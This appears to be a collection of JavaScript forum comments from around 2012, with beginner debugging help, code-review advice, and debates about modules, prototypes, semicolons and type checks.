Just to make sure I'm doing this right, the "myCheckbox" is replaced with the ID that I'm using for the checkbox, and the "myDropdownList" is the ID for the dropdown list that I want to hid. Is that right?
one liner var text = "hello ${world} hello ${foo} " var data = {world:"worlds", foo:"bar"}; text = text.replace(/\${([^}]*)}/gm, function(o,i) { return data[i] }); 
you can use the onchange attribute &lt;input type="checkbox" name="customize" onchange="javascript: checkboxChange(this);" value="Customize" /&gt; `function checkboxChange(c){ if(c.checked){ // show what you want }else{ // hide what you want } }` 
I really like this pattern; it's more robust than my know-nothing, just-execute callback approach. Thanks!
Declaring var vars inside a function (closure) scopes that variable to only reside inside said function (closure). You can either declare vars globally outside the function or you can declare it inside the function without the leading "var" which will force it to the global scope, or you could declare it via window.vars which too will force it into the global scope.
Nice, this could be very useful for testing production environments. Thanks. 
It's a spec, yes, but it's not supported by any special language features or constructs at all. Ergo, it can only be implemented in userland code and the only constraining forces to hold implementations to the spec is the spec itself. On the other hand, supporting language features would make the task of enforcing spec-adherence a non-issue; if it's not up-to-spec, it won't compile/interpret. &gt; PHP namespaces have nothing to do with JavaScript. Thank you, Captain Obvious. Now, take a step back and look at the bigger picture -- they're both new additions to the language which require supporting language constructs. Language constructs which could take many forms for implementation, and for which there are (were) many competing views about which implementation would be better for the ecosystem. I can assure you, that these problems that arise in software....most of them are not new problems at all, just new to the particular language.
that's what I mean, it is declared outside the function, but I can't get it to return a value anywhere other than inside of the function. 
Nice.
Nothing to do with closure - vars will be returned fine from the function. The problem is with *what* you're returning - you're assigning a scalar (hash[1]) to vars (an array) ...and then hoping to extract a keyed value ("id") from it. You probably wanted something like ... vars[hash[0]] = hash[1]; 
whoops, skimmed the code, misunderstood the question, looks like you're correct.
http://140byt.es/keywords/string
edit: i noticed you had a lot of funky things going on here. one thing you did wrong was you made an array with vars = []; but then when you assign something into that array, you simply do vars = hash[1]; this means that instead of an array, vars is now whatever was in hash[1]. if you wanted to put something into that array, you can do that in a few ways. vars.push(hash[1]); pushes it onto the end of the array or you could calculate the length of it (you could use your looping variable i for this or the vars.length) and then place the new element into the last slot. java script handles making your array bigger or smaller for you automagically. I can bet that when you tested this you didn't test it using all the edge cases you could with your URL - try your code and mix around where you put the var you wanted... your code will always return vars as whatever the last thing hash[1] was. But the real problem with your code is you only wanted one of those things from the url correct? So instead of taking the ["id"] of it after... just pass into the function the name of the url variable you wanted! function getURLVar(id){ /* snipped your code */ return vars[id]; } you can't simply just add that to the bottom through - remember you had other errors as well. An advanced trick to this would be to instead of storing all of the data into the vars array, you can simply just return from inside the for loop the second you found the thing you wanted. You simply compare the passed id from the function arguments, to the current thing you're looking at in the loop. When you find what you wanted, just return from there. At the bottom of the function you would then put something like return null; or return undefined; to signal an error happened. This could be however you choose to do it - esp in java script where you didn't have to define a return type
I can't think of any specific examples off the top of my head, but I can tell you that it's the sort of thing where once you learn how to use it and do it once or twice, you start seeing more and more chances to apply the technique.
No, you don't get it. I want modules, they're very very important, but that doesn't mean I think we need new syntax.
&gt; it's not supported by any special language features or constructs at all. Thats the best part. It doesn't matter if vm has to do extra work to check if the code is up to spec. Thats the vm's job. The program shouldn't have to express things differently to make things easier for the compiler. Compilers serve programmers not the other way around. The reason I didn't like your example is because the arguments for and against harmony modules vs arguments for or against PHP namspacing are not equal and cover completely different topics. Two scenarios are not even remotely comparable.
It ruins the language because modules already exist, this is just like adding a class construct to javascript. 
CommonJS modules are an elegant workaround that fit JavaScript. Which is why Harmony should not overlook them. I wouldn't mind syntactical sugar on CommonJS modules as long as the underlaying implementation is based on their design. As opposed to copying a foreign approach from a different language. That's silly.
In node.js they exist. And anyone could implement them easily on their own with JavaScript.
typeof is a keyword, but people still confuse it for a function.
Yea, as long as it fits JavaScript patterns and I can capture a module's api in a variable I fine with it, but I feel that Harmony adds a bunch of shit that we don't need and that complicate the whole system.
If you don't like prototypes that why do you use JavaScript? JavaScript is a functional language modelled after scheme. Classes do not add anything that cannot be accomplished in the language without them. Most of the arguments for classes are something like "they're language X and I really like them" or "I like using them". Both are terrible reasons.
I'm okay with that reserved list bullshit. this['reserved'] or this.reserved in node.js
If you want to discuss specific implementations, then perhaps I should point out another implementation of ECMAScript, specifically ActionScript. ActionScript has been around roughly the same amount of time that JS has, with the striking difference that it's implemented `import` for most (all?) of that time. Now, do you still want to play the "use ours because we thought of it first" card?
You're wrong, it's an ECMAScript dialect just like JS is (and I never said AS was JS). It's a fact and not a matter of opinion, and it's pretty funny that you would even try and argue that.
this.import = 0; // 0
I am aware that ActionScript is a dialect of ECMAScript. That doesn't change the fact that its bastardized JavaScript. Its strongly typed, it is classed based not prototype based, It is nothing like JavaScript is the most important ways. Apart from the C-like syntax ActionScript is closer to Java then JavaScript. JavaScript was designed to be a functional language similar to Scheme or LISP. ECMAScript is a standard of JavaScript. Its called ECMAScript because Sun, now Oracle owns the name "Java".
People who don't have a clue how to program JavaScript properly.
ActionScript is based heavily on ECMAScript, 5th Edition spec.
It looks fantastic, I love it. The only problem is getting it to integrate with the rest of my script. The page is [here](http://justinwestphal.com/test/calculator/calculator.html) if you have a minute to take a look. Thank you again for writing that out!
Some new features can't be backwards compatible, but whenever possible I think it's a good idea.
I've been fighting the fight to extend prototypes for a while now with Sugar (http://sugarjs.com). Sugar also implements Function#fill, which as far as I can tell is identical. Most people look to array functions when they think of the niceties of functional libraries, but imho the Function extensions are some of the coolest parts of Sugar (and Underscore as well for that matter). "partial" (fill), "lazy", and "debounce" can all be massively powerful in the hands of someone that knows how to use them. +1 Also, although extension of prototypes is maybe the biggest perceived difference between jQuery and Prototype, I think that there are a lot of more complex reasons to jQuery's success. Encapsulating a selector into an array-like object was perhaps maybe even more influential, and that for a few different reasons....
Sugar (http://sugarjs.com/) has this as String#assign... you can use object keys or argument numbers: 'Hello {name}'.assign({ name: 'John' }); 'Hello {1}'.assign('John');
I have a feeling turning `module` into a statement could break just about every CommonJS module in node.js, or make things a bit confusing. They should change it to `package` or `namespace` then I'm happy. Nothing wrong with Harmony modules and CommonJS modules.
I like a lot of languages , C++ and PHP for example. However I don't think they should be mixed together in to a one heaping mess.
Prototype actually has a method called $$(selector) that returns an array. I think the two huge differences between jQuery and Prototype are: the disagreement about extending prototypes and chaining. jQuery's chaining is a pretty radical difference. Sugar is pretty cool. The difference between this implementation of Function#partial and Sugar's implementation of Function#fill is that fill loses references to any attributes that may have been added to the original function. (Believe it or not, this can be a useful feature and it's not just a pedantic point; it's come up for us.) Consider this case using Sugar's fill: (function () { var f = function (a) {console.log(a);}; f.foo = 'bar'; return f.fill('hello').foo; })(); // returns undefined Whereas the same thing with partial: (function () { var f = function (a) {console.log(a);}; f.foo = 'bar'; return f.partial('hello').foo; })(); // returns 'bar'
Did you read that article? It seems to me like you don't really understand the concept of asking strangers for help. If you're asking random people to take time to help you, you need to make the barrier of entry very low, hence structuring your questions properly. That being said, since you can't seem to take enough time to properly capitalize or punctuate your sentences, I doubt you'll ever understand what I'm talking about.
First, it is going through the for loop, but in your document ready, i is probably 20. It may be easier to set it up with the ids for the hidden elements to be the 'parentId-hidden'. That way you will not have to loop over to find them and attach the hover action. give the parent ids a class if you would like to make it easier to group them. $('.hover-action').hover(function(){ var hoverId = $(this).prop('id'); $(hoverId+'-hidden').show(); }); I'm sure there is a bit of a cleaner way, but that is what I could come up with early in the morning.
$(document).ready(function(){ for(var i=0; i&lt;20; i++){ $("#show"+i).hover(function(){ $("#hidden"+i).toggle(); }); } }); your for loop does nothing right now, because there's nothing between the curly braces next to it. You should surround that code that sets the hover listener with the for loop. Lastly, because the loop has i&lt;=20, from i = 0, it would actually do this for 21 elements.
Hey, In this instance, it's probably best to use a class, rather than an ID with incrementing numbers on the end. Then you don't have to ever modify your JS (once it's working) if you want to add more tool tips. You could have markup like this: &lt;div class="tooltip-trigger"&gt; &lt;div class="tooltip"&gt;&lt;!-- tooltip content to show and hide --&gt;&lt;/div&gt; &lt;/div&gt; and jQuery like this: (function($) { $(document).ready(function() { //mousein $('div.tooltip-trigger').hover(function() { //show the tooltip that is inside this hovered element $(this).find('div.tooltip').show(); }, //mouseout function() { //hide the tooltip that is inside this hover element $(this).find('div.tooltip').hide(); }); }); })(jQuery)
Where is the &lt;div&gt; in relation to the &lt;p&gt;? There is probably a much simpler way to do what you are trying to accomplish.
 $(document).ready(function() { $(document).on("hover",".show-action", function() { $(".hidden", this).toggle(); }) }) This is how I'd do it, but it can't be 100% right unless we see part of the HTML code. Basically, you should take css_n1nj4's advice and give them all the same classes. 
The div is not associated to the &lt;p&gt; directly
After using Backbone with some deeply nested namespaces, I thought a little utility to help with creating and referencing namespaces could be useful.
&gt;i=0; // there are 20 different id's I want to have this jquery in for(i=0; i&lt;=20; i++){ } var declaration? Look at the console to catch your other errors. 
it's just one step to view which source file emitted the rule you're looking at... 
x-posted to [/r/webdev](/r/webdev) and /r/programming BabelExt was born out of work I did to get [Reddit Enhancement Suite](http://redditenhancementsuite.com) to work in multiple browsers. This is my first foray into creating any kind of a boilerplate, library or framework for mass consumption and reuse. I would love feedback from anyone interested in taking a peek and critiquing the code. The goal of this project is not to provide some massive do-it-all framework, but rather to take the busywork out of the simple stuff. There's slightly different code for handling a lot of common browser extension tasks (showing notifications, making cross domain http requests, etc) and BabelExt abstracts that away and handles it all with one function call. The idea isn't to make something super powerful, but to provide a lightweight starting point that eliminates some busywork and lowers the barrier to entry for developers wanting to create browser extensions.
One step that is very confusing, time consuming and I do not want to do. Your brain may be awesome at converting compiled code into non-compiled code. My brain is stupid and doesn't want to think about anything it doesn't have to.
ah, no when you view the actual css source, it tells you what file and line number made that CSS rule. there's also a plugin for Firefox that reads that comment for you
The line numbers shown in the inspect window relate to the compiled css file. This doesn't match up with the LESS or SASS version of the file. I know FireSASS exists, but I prefer to develop mostly in Chrome which is why I look forward to the webkit version of this that supports LESS or SASS. Can't tell if your trolling or really don't understand what I'm talking about.
Wait, are you saying Webkit already supports display the correct SASS line numbers? I'm a bit confused by this explanation, but I'm getting slightly excited about the fact that my SASS woes are just a misunderstanding of how to use it correctly. **EDIT:** I think I understand after reading that again. SASS will do the translation line numbers for me via comments on the compiled css file? That's pretty awesome, and thanks for explaining it to me. I should try SASS again. :) Do you know if LESS does the same thing?
The usages for this give dividends when you're working with functions that take other functions as parameters. This is a key part because it partial application allows you to make new functions with different signatures and different types of output without having to actually rewrite the same stuff over and over. This example uses partial application. Array.apply(null, Array(32)).map(Function.call.bind(Number)).map(Math.pow.bind(null, 2)) * Note: the distinction between currying and partial application is almost useless in JavaScript because of `arguments` and the complete lack of limits/checks on parameters. A good way to implement curry simply uses partial to do it, so a curry is a sequentially filling partial that returns a bound version of itself until the parameters are filled.
You see what I'm getting at, though, right? While Javascript's dot notation is very compact for getting at a particular reference, mostly negating the need for an ``xpath`` for JSON, it can be very useful to be able to just pass a string between functions/callbacks that cross an AJAX barrier (for instance) and can't directly reference the actual value. It would also be useful towards building a JSON equivalent to [xquery](http://www.w3schools.com/xquery/default.asp) that is not as bizarre as MongoDB's query syntax.
This snake game has no apples
RES needs something like this so badly. So many different branches and calls to Safari, Opera, Firefox, and Chrome APIs. It's insane.
It's cool..but you gotta have at least 1 CPU opponent to face to be Tron!
did you press one of the keys to start? Can you provide some more details on what/why it's not working?
I love that you guys actually explained how it works. Any more?
Wow awesome! Correct me if I'm wrong, but I think you can shave off three more characters by replacing the condition `(z[x+=[1,-n,-1,n][e.which&amp;3]]^=1)` with `z[x+=[1,-n,-1,n][e.which&amp;3]]--` and swapping the other two operands of the ternary operator.
Yea, I pressed i,j,k,l - I tried all sorts of keys. I just see the black box. It does work in Firefox and Safari, though. (FWIW, in Safari it seems to handle much better than in Firefox. Goes too fast in Firefox). The problem on my end may have to do with an extension.
Very clever, especially use of keys i through l for input, as well as the inline lookup table [1,-n,-1,n].
[Have you seen this? Snake game in uri data...](http://bytex64.net/code/datasnake/)
Thank you. When I read the title I thought it was talking about a clone of [the actual Tron](http://en.wikipedia.org/wiki/Tron_%28video_game%29) and I got excited.
&gt; note: hitting any other key will also move the tron in various directions. Filtering all other keys requires 4 more bytes. What are the 4 bytes, just curious?
Forever a tron...
If you need to share JS/HTML/CSS take a peek at http://jsfiddle.net/
intentional, let me know what is confusing &amp; I can add explanation.
What's your intention? Are you trying to write self-documenting code?
Fair 'nuff. When you get around to writing production code, of course, write comments so that the experts (read: co-workers or future you) don't have to waste too much time reading through it to figure out what's going on.
I think jslint likes to see a single var statement ... there's a reason, but it's still hard to get used to IMHO 
EDIT: formatting messed up, read it raw here: http://pastebin.com/SFBcEfAi I was expecting some awful looking code with evals and new Array(), this code doesn't suck, nice job! There are a few tings that could be improved though: 1. Use more whitespace: function (generalobject) { var placeholder = $('&lt;div&gt;&lt;/div&gt;'), logo = $('&lt;img /&gt;'), sitetitle = $('&lt;h1&gt;&lt;/h1&gt;'); logo.attr({ 'id': 'logo', 'src': generalobject.logo, 'alt': generalobject.name }); sitetitle.html(generalobject.name).attr({ 'id':'sitetitleh1' }); placeholder.attr({ 'id': 'sitetitlepd' }).append.apply(placeholder, [logo, sitetitle]); return placeholder; }; That looks a little nicer. 1a. Use consistent whitespace: for(i = 0; i &lt; menuobject.length; i += 1 ){ for(i=0; i &lt; fields.length; i += 1){ make them the same: for (i = 0; i &lt; menuobject.length; i += 1) { for (i = 0; i &lt; fields.length; i += 1) { 1b. Indent vars: var f = $('&lt;form&gt;&lt;/form&gt;'), ftitle = $('&lt;h3&gt;&lt;/h3&gt;'), fields = formobject.fields, validationrules = formobject.rules, fieldsArray = [], attribs = {}, fieldAttribs, pd, lbl, field, fieldObj, i, j, option, options; Indent the lines other than the first line: var f = $('&lt;form&gt;&lt;/form&gt;'), ftitle = $('&lt;h3&gt;&lt;/h3&gt;'), fields = formobject.fields, validationrules = formobject.rules, fieldsArray = [], attribs = {}, fieldAttribs, pd, lbl, field, fieldObj, i, j, option, options; 2. Use prototypes - Maybe your teacher didn't teach them yet but this is begging for them: function LayoutRenderer (jsondata) { ... } LayoutRenderer.prorotype.buildGeneral = function (generalobject) { ... }; 3. understand when to use typeof this: typeof this.layout.modules !== 'undefined' doesn't need typeof, this.layout.modules !== undefined works, but as long is it will never be the number 0, you can just check for truthyness: if (this.layout.modules) 4. Why are you using apply here and other similar places?: .append.apply(placeholder, [logo, sitetitle]); just .append should work: .append(logo, sitetitle); 5. Use templating - In real life you wont have such a dynamic source json object, you can use some templating instead of having a bunch of js that generates html. underscore.js has simple templating http://documentcloud.github.com/underscore/#template this is popular for jquery http://api.jquery.com/jquery.tmpl/ also mustache https://github.com/janl/mustache.js there are many others 6. if you want to be HTML5 1337 you can omit type="text/javascript", that is now optional &lt;script src="assets/js/jquery-latest.js"&gt;&lt;/script&gt; 7. Use actual JSON - the way you load the json is a little weird, you could get rid of the `var jsonObj = ` and the script tag that loads it, then load it with $.getJSON() Mind me asking what school you're going to and if they told you to use jslint of you started using it n your own? You are definitely on the right track to becoming a great JS dev, keep it up! I am happy to do code reviews anytime.
Whenever I do code for production I do comment it. In fact, I do follow the policy of minimum documentation, always have function/method definition in javadoc style so that some automated tool can read it and generate minimum documentation.
My sympathies if you end up at a Microsoft shop and have to switch from javadoc to vsdoc style commenting. It's essentially the same, but the syntax is different enough to trip me up.
I agree with all this except vars nit being at the top. The reason to put them at the top is hoisting, even before the `var` is reached the variable is still registered in the scope, this can lead to bugs. if (false) { var j = "hi"; } else { j = "what"; } Will j be a global variable after this is run? Nope! http://jsfiddle.net/B9kZC/2/ And I nether agree or disagree with quoting keys.
MS will never hire me, I have switched to Linux totally, I miss two things a) IE b) Photoshop 
&gt; Another stylistic thing: rather than returning a big chunk of function result, assign it to a variable and then return the variable. It's much easier to debug if something's going wrong with the returned blob and a minimal efficiency hit. Can't disagree. And .call() vs .apply(), the latter takes the function object as first param and the second param is array or arguments, where in .call() the first param is function object and rest are arguments. I have devised a simple rule, if I don't know number or args I will use .apply() else .call(). I am really not sure which one is better.
&gt; hoisting I remember John Resig's article or a slide mentioning about it. I can only up vote you once for reminding me this word.
So if there are 10 FE jobs, I can essentially apply for 5. I dont have RoR or Python experience. I do fiddle with Python but never even did a hello world in RoR. I am doomed. 
&gt; Do you mean, you use apply if you don't know the arity (number of parameters) of the function you're executing? Yes. For example, I may not know how many form fields that json data object may have, I will collect all the fields in a list/array and use it in .apply().
sigh... so tired of chrome being treated as the default browser. It's usage is still in a minority. If it doesn't work across the board, its a browser hack not an app... There are web standards for this very reason. that said, at least this was only a proof of concept and not really geared to be an app so it doesn't really matter.
I'm going to be "that guy" and say: have you considered a mac? Here's a bit about me: I'm an ubuntu user since Warty Warthog, and I consider most of today's operating systems to be cruft wrapped around a terminal (with some exceptions). I swore I'd never work in a .NET shop, but then for the last 2 years, *le sigh*. In the last place I worked, I ended up as the front end guy, so I talked my way into getting a MacBook figuring it must be better than that decrepit thinkpad that I was assigned. I was correct; as a wrapper for a terminal, it was pretty awesome. iTerm2 is fantastic, and with MacPorts, it wasn't hard to get all the things that I wanted to have up and running in OSX. Also, photoshop works quite nicely. I don't grok your point about missing IE, unless you just mean for testing. I've since left that job, and I decided that I wanted to continue using a mac for some things, so I purchased the low end Mac Mini, dropped in 8 gigs or ram, and I have a fairly beefy desktop for a few hundred dollars. Let me be very precise here: I am not an Apple fanboy. It took me 10 years to get over my loathing of the company enough to use a Mac long enough to not hate them. But once I got there, it's been nice. I also picked up the magic mouse and tiny little wireless keyboard, and the form factors for both are amazing. I think I may have wasted money on the mouse, especially considering that I mostly spend my time in bash/vim.
OS discussions would be off the track but here are my views. I use Debian. I am a user. I am not a Linux Ninja. Just a user. I thought why should I spend my hard earned money on some thing which I really don't need. I don't need MS Windows. I need browsers and a bare minimum text editor to work as HTML/CSS guy and to do server side coding I need PHP/Python/Perl and Apache. So Linux was a clear choice. I am not a MS hater though I don't miss a chance to laugh on MS. Its cool actually ;-). Now Apple, no disrespect to anyone but IMHO Debian on Thinkpad is much better than Mac on any given day. The only problem is "hardware looks" or design. You can swear by Apple's hardware and the build quality. At work I had a choice of asking for a Mac or a PC. I got a PC. IT policies forbid me from removing Windows XP and installing any other OS. I formatted the laptop and have been running Debian. I feel comfortable with Debian. That's it. Oh, I miss IE coz there are times when you have to test for IE and you are begging your cow-orker for Windows laptops :-)
The constructor to `Array` is confusing: `new Array(5)` is *completely* different from `new Array(5,6,7)`. It's not possible to make a single element array via the Array constructor. It would have to be: var a = new Array(); a.push(4); But the real reason is `var a = [5,6,7];` is much cleaner and easier to read, and the above example also simply becomes `var a = [4];`
Hmm. Good point. But what if I want a to make an Array, whose length wont be fixed? For that reason I have always done it this way: var a = new Array(); a.push(4); any thoughts on that?
So have I, and using new Array makes it easier to identify when trawling through your code
I'm looking for a fighting game fan who can code to create fighting game international community website together. Any fighting game player, stream monster or just a fanboy who likes nodejs.
What are the chances that Microsoft's implementation will be compatible with Firefox and Webkit implementations? In other words, say you take websocket code on that works on Firefox, Safari, and Chrome.. any chance it will work on IE 10? Or will there be some subtle incompatibility that is nevertheless close enough or closer to the spec which makes everyone write special code for IE websockets?
Me too.. I think this is going to be possible with the next Coffeescript and Chrome releases. I am assuming this thread will have more info https://github.com/jashkenas/coffee-script/issues/558 if you scroll to the bottom within the next few days/weeks.. someone will probably make a tutorial. There will be a post on r/coffeescript and r/javascript also I assume.
Nice. I didn't realize if the argument isn't a number it becomes a single element array.
I can not recall where but I have read somewhere, may be one of steve souder's books or articles, that said do not append elements to DOM in while looping. Build a fragment and then append them to DOM. What you are looking it is based on that suggestion but you are right as well I am not appending items to DOM immediately. 
&gt; Generally, it all looks pretty good to me - it's a whole lot better than what I usually see when I interview anyone. Thanks, will you hire me? I just need to be paid and you don't need to ask me to work :P. Jokes apart. I did try to find it $('&lt;div/&gt;') is better or $('&lt;div&gt;&lt;/div&gt;'), a SO thread said the latter is better. I will pull up and read why. I agree about code being verbose and not using descriptive names. I had commented what pd meant but then removed that comment, why? I dont know. :-S Regarding context, I get confused by context and closure. Any good article/pointer/source you can suggest?
I agree almost across the board. However, this Mac Mini was inexpensive; it's a beast at a few hundred dollars. One of the best value-for-dollar purchases I've made computer-wise in a long time. My sole point is this one: you won't necessarily change your workflow, and you can add in Photoshop. Of course, Photoshop itself is around 700 bucks, so my whole point is self defeating; if you're on a budget, photoshop itself just isn't a good option.
Yeah, I guess. I happened to have a good monitor, which helped, and acceptable mice and keyboards (though I did purchase the magic mouse and the keyboard, but as I said, perhaps a superfluous purchase). When you already have the peripherals, purchasing a desktop is pretty easy.
Aren't they implementing more frequent auto updates for IE soon? So hopefully we won't have to live implementation bugs for as long as IE6 etc. 
That would be good, but I am guessing people are going to be stuck having to support IE 8 and IE 9 releases for awhile.
Well, here's the concrete case that first brought it up for me. We have these functions that create a form to edit a specific data structure. [Here is a small example](https://github.com/OpenGamma/OG-Platform/blob/master/projects/OG-Web/web-engine/prototype/scripts/og/views/config_forms/og.views.config_forms.currencymatrix.js) of one. Our module registration system can accept a module that returns a function or an object. The way this particular function would be called is: og.views.config_forms.currencymatrix({/* some config object */}); Now the thing is, sometimes I want to preload values into a function, but if you'll notice, that function also has a meta description of the data types of each of its fields: og.views.config_forms.currencymatrix.type_map So, this function is actually defined as: // note that og.views.config_forms['default'] is a function constructor = og.views.config_forms['default'].preload({type_map: type_map}); constructor.type_map = type_map; return constructor; ... I wasn't using partial with it. I actually have another method (for another blog post sometime soon) called Function.prototype.preload which lets you pre-populate functions like this that take one hash table as an argument. But the fundamental idea is the same: the partial'd or preloaded function needs to still have a reference to the original's type_map attribute. Because in the code that uses this function, I need for it to both be a function and still have that meta information attached to it. *** Also, I just remembered, Prototype has a [method called invoke](http://api.prototypejs.org/language/Enumerable/prototype/invoke/) that can be used on Enumerables, but it's definitely a lot more awkward than jQuery's interface.
I think I finally understood *this* by using it a whole lot to find out how it worked, rather than reading any specific resource. I recommend [Professional Javascript for Web Developers](http://www.amazon.co.uk/Professional-JavaScript-Developers-Nicholas-Zakas/dp/1118026691/ref=sr_1_1?ie=UTF8&amp;qid=1332675248&amp;sr=8-1) by [Nicholas Zakas](http://www.nczonline.net/). Also check out [Addy Osmani](http://addyosmani.com/blog/)'s blog, especially his piece on [Javascript Patterns](http://addyosmani.com/resources/essentialjsdesignpatterns/book/). Would I hire you? If I was in a position to do so, sure! But I'm a contractor ;)
Because programmers are pedants. It doesn't matter at all.
Only things I'd suggest are: * Use a raw object instead of a 'new' instantiated class; it's less moving parts. * use 'c in a.b' instead of typeof a.b.c == undefined * Why is pageModules declared as an Array? It seems associative in nature. * Instead of switch(module.type){ case 'navigation': pagemodules[c].append(this.buildNavigation(module)); break; case 'content': pagemodules[c].append(this.buildContent(module)); break; case 'form': pagemodules[c].append(this.buildForm(module)); break; } you could possibly just go pagemodules[c].append(this['build' + module.type](module)); (making allowances for case, of course)
What do you mean with the following? Didn't understand. &gt;Use a raw object instead of a 'new' instantiated class; it's less moving parts. And what is the advantage of using 'property in object' thatn 'typeof object.property == undefined'? I like your clever way of avoiding switch case.
not on a mac
What if the software you're writing relies on, e.g., (function{}).toString() that isn't necessarily reliable in coffeescript? Coffeescript isn't a panacea, no matter how hard you push it...
&amp;#3232;\_&amp;#3232;
Your example isn't valid JavaScript either. But if there is something that coffeescript can't handle, you can embed JS using backticks.
Nothing. Results in a syntax error. However, (function(){}).toString(); will print out "function() {}", which I'm assuming warfangle meant.
Wait, so how does coffeescript deal with variables in strings then?
[about those semi-colons](http://blog.izs.me/post/2353458699/an-open-letter-to-javascript-leaders-regarding)
&gt;Do your best to never use a semicolon. This means avoiding them at line breaks and avoiding multi-statement lines. This sounds sarcastic-ish. You always use semicolons because it prevents silly errors or mistakes. I think the whole page might be a joke.
&gt; This is a guide we use for our own apps internally at GitHub. We encourage you to setup one that works for your own team. They aren't marketing it as a general javascript style guide. It's obviously clear that it's Github's style guide.
I don't use semicolons anymore. Looks much cleaner, comes natural for me and never caused any problems so far. 
I know the link has already been posted below, but it seems so relevant here I want to put it in again: [getting by without semicolons](http://blog.izs.me/post/2353458699/an-open-letter-to-javascript-leaders-regarding) is perfectly possible. This is what they are getting at with the page. Writing JavaScript with minimal semicolons forces you to understand what is going on.
So long as you know why, that's all that matters.
You've been given advice in this thread regarding "in", "typeof", and "==" in this thread, but so far I haven't seen anyone really explain it to you. Allow me to attempt... The first thing to understand is that all these things *have different purposes and are used for different things*....no one individual one is "correct" in general, *only correct for a particular case*. First let's cover "in". Use "in" *when you just want to check for the **existence** of a property, and don't care about the value. Consider this example: var foo = {}; console.log( "bar" in foo ) // will output: false However, consider this example: var foo = {}; foo.bar = undefined console.log( "bar" in foo ) // will output: true Another thing to note is that "in" will *look up through the prototype chain. var a_foo, parent; parent = { bar: "baz" }; function Foo() {}; Foo.prototype = parent; a_foo = new Foo(); console.log( "bar" in a_foo ); // outputs: true​​​​​​​​​​​​​​​​​​​​​​​​ // if you *only* want it to be an instance property, you can use .hasOwnProperty: console.log( a_foo.hasOwnProperty("bar") ); // outputs: false Now, since in JavaScript, if you try to lookup a nonexistent property on a object you will get undefined: x.bar == undefined Is the same as "in" except it will also cover cases where the value of bar has been set to the *value* undefined. So really, for your use case I disagree with the poster that "in" is better since a property that exists but holds the undefined value is probably of little use to you. Now, in terms of typeof x === "undefined" vs x == undefined etc: Use typeof when a variable may **be** undefined as opposed to simply **holding the value** undefined. Basically if you're not sure whether the variable will actually be defined or not. For example: function foo ( bar ) { if ( typeof bar == "undefined" ) { } } "bar" will *always* be defined within the scope of foo, so you don't *need* typeof. x == undefined and x === undefined *should* be exactly the same in most cases (in terms of functionality), they both check that x **holds the value** undefined. (only undefined == undefined will ever be true, as opposed to null as you will see) The caveat is that if some jerk does this: undefined = 5; The differences in the strictness of == and === will cause them to behave differently, as in other cases. If you want to check for undefined **and** null, you can do: x == null Out of all the things so far, this is probably the one you "want" most often, though note it will probably make JSLint complain. Well technically what you probably want is **none of these things**. Consider this: if(typeof this.layout.modules !== 'undefined'){ modules = this.layout.modules; for(i = 0; i &lt; modules.length; i += 1 ){ // snip } } } Ask yourself "What am I **really** checking for in this if? JS is a dynamically typed language, and that's *great*...but that doesn't mean you never think about "what sort of value is this variable?" Consider your code...what happens if for some reason, somewhere this happens: this.layout.modules = 5; In this case, typeof this.layout.modules !== "undefined" will evaluate to **true** and your block will run. Here, your for-loop will just never get evaluated but in other cases you may get a run time error and your script will just choke. However, note that this **is not** what you really care about here.... what you you **really** care about here is not whether this.layout.modules exists, but whether it **exists and is something that behaves like an array** and contains items that have a "container" property. There are various ways that you can nail down whether an object is an "Array" or not, but in this case that's more trouble than it's worth and not ideal anyway. All you care about is that it is *array-like* object. Checking for a "length" property should be enough. So in real code, you probably want something like this: // in your code you use this.layout.modules, but you prob want this.modules // note you explicitly set this.modules earlier in your program so it will never be undefined modules = this.modules; if ( modules.length &amp;&amp; modules[ 0 ] &amp;&amp; modules[0].container ) { for(i = 0; i &lt; modules.length; i += 1 ) { // snip } } else { // do something to tell the user in a pretty way that the page is broken // maybe send a report back to the server } This code is basically the same as the old version, but it's more robust. There's still things that could go wrong, but not as many...it will handle many cases better. This is good because now if you change your app you don't have to go through your codebase trying to find all the places you didn't think ahead. The point is not to be uber paranoid and **CHECK ALL THE THINGS** but find a balance between being robust + flexible and succinct + efficient. Pulling in JSON data is one area to be careful, because who knows if the server will really send what you think it will. Furthermore, later on you may upgrade your program to pull in data from multiple sources, etc....who knows what the future will bring. It's no fun for users when your script just chokes and dies, they get a half broken page with no idea what's going on. When possible, use a little effort to try and prevent possible errors, and if possible recover from them with a pretty error.
The AJAX wrapper methods now return jqXHR objects, so you can chain result callbacks (done(), fail(), always() to be 1.8 forward-compatible) to any of them.
Ok I see now. So it looks like you're mapping data onto functions directly. I do wonder a bit what the "best practices" gods would have to say about that, but on the other hand it really doesn't matter... you're doing it and it's working for you, so that's fine. However just like you say, it's possible to lose the data mapped to it... one way this would work using Sugar would be: Function.extend({ preload: function() { var fn = this.fill.apply(this, arguments); return Object.merge(fn, this); } }); This would let you continue to use partial functions with the (a bit) special case of having data mapped to them. As a matter of fact however, this at the moment won't work because Object.merge doesn't allow functions to merge in their properties. However I think I'm going to change this as based on your use case here it seems not unlikely that functions (and in fact other data structures) may in fact have data mapped to them, and this should be merged as well. Mapping the data on *every* method that returns a function, however, seems a bit too much. It would be hard to draw the line there because it's not impossible that data may be mapped to other structures like strings or arrays, but I definitely don't think everything that returns a new instance should necessarily have its old reference's properties mapped to it (not to mention it would waste cycles). However, like I mentioned above you're use case *is* inspiring me to think sideways a bit more, and I wouldn't want to actively make things more difficult for you if you do chose to have properties on functions like this (as Object.merge is obviously doing). Re: jQuery, what they did that was brilliant is to make that "invoke" behavior default. Of course it was not a decision without consequences and I'm sure people at first were very non-receptive, but after a certain critical mass, this almost certainly made the difference to their mass adoption. If you look at jQuery's 1 line of code vs prototype's 3 (minimal) AND everyone is jumping on board as well, you would almost certainly choose it. Prototype had all the pieces there but jQuery put it together and baked it in as default. It's too often implied that user experience is something devs do for users but no one cares about for devs, but it's a chain all the way down... jQuery seemed to pick up on this....
I guess I didn't explain that feature well enough... You can embed arbitrary javascript for the purpose of *executing* that arbitrary javascript. In other words, there's technically nothing you can do in javascript that can't also be done in coffeescript. Here's an example of doing exactly that: http://jsfiddle.net/pYN48/ The bigger point is probably that this is generally a terrible idea in either language. In the few scenarios it makes sense (like writing a code coverage tool), you don't interpret the javascript and then use toString()... you load it from original source into an AST that can be manipulated, and then interpret it. Incidentally, you could stay all-coffeescript that way too, because it has a very well documented parser/tokenizer/AST generator.
